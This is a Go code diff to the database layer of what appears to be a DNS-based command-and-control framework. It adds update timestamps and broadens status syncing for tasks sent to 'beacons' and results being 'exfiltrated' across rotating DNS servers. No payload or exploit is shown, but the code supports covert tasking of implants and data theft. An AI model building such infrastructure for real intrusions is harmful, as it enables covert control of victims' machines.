@@ -996,7 +996,8 @@ func (d *MasterDatabase) SaveResultChunk(taskID, beaconID, dnsServerID string, c
 		var currentStatus string
 		err := d.db.QueryRow("SELECT status FROM tasks WHERE id = ?", taskID).Scan(&currentStatus)
 		if err == nil && currentStatus == "sent" {
-			_, err = d.db.Exec("UPDATE tasks SET status = ? WHERE id = ?", "exfiltrating", taskID)
+			now := time.Now().Unix()
+			_, err = d.db.Exec("UPDATE tasks SET status = ?, updated_at = ? WHERE id = ?", "exfiltrating", now, taskID)
 			if err == nil {
 				fmt.Printf("[Master DB] Task %s status: sent → exfiltrating (first chunk received)\n", taskID)
 			}
@@ -1251,9 +1252,10 @@ func (d *MasterDatabase) MarkTaskDelivered(taskID, dnsServerID string) (bool, er
 		UPDATE tasks 
 		SET status = 'sent',
 		    delivered_by_dns_server = ?,
-		    sent_at = ?
+		    sent_at = ?,
+		    updated_at = ?
 		WHERE id = ? AND status = 'pending'
-	`, dnsServerID, now, taskID)
+	`, dnsServerID, now, now, taskID)
 
 	if err != nil {
 		return false, err
@@ -2173,15 +2175,16 @@ func (d *MasterDatabase) GetCompletedTasksForSync(dnsServerID string) ([]map[str
 	d.mutex.RLock()
 	defer d.mutex.RUnlock()
 
-	// Get tasks that are completed/failed/partial and haven't been synced to this DNS server yet
+	// Get ALL task status changes (sent/exfiltrating/completed/failed/partial)
+	// This ensures all DNS servers stay synchronized even when beacons rotate
 	rows, err := d.db.Query(`
 		SELECT id, beacon_id, status
 		FROM tasks
 		WHERE assigned_dns_server = ? 
-		  AND (status = 'completed' OR status = 'failed' OR status = 'partial')
-		  AND (synced_at IS NULL OR synced_at < completed_at)
-		ORDER BY completed_at ASC
-		LIMIT 50
+		  AND status != 'pending'
+		  AND (synced_at IS NULL OR synced_at < updated_at)
+		ORDER BY updated_at ASC
+		LIMIT 100
 	`, dnsServerID)
 	if err != nil {
 		return nil, err
@@ -2615,9 +2618,9 @@ func (d *MasterDatabase) markTaskCompleted(taskID string) {
 	now := time.Now().Unix()
 	result, err := d.db.Exec(`
 		UPDATE tasks 
-		SET status = 'completed', completed_at = ?
+		SET status = 'completed', completed_at = ?, updated_at = ?
 		WHERE id = ? AND status != 'completed'
-	`, now, taskID)
+	`, now, now, taskID)
 
 	if err != nil {
 		fmt.Printf("[Master DB] ❌ Error marking task %s as completed: %v\n", taskID, err)
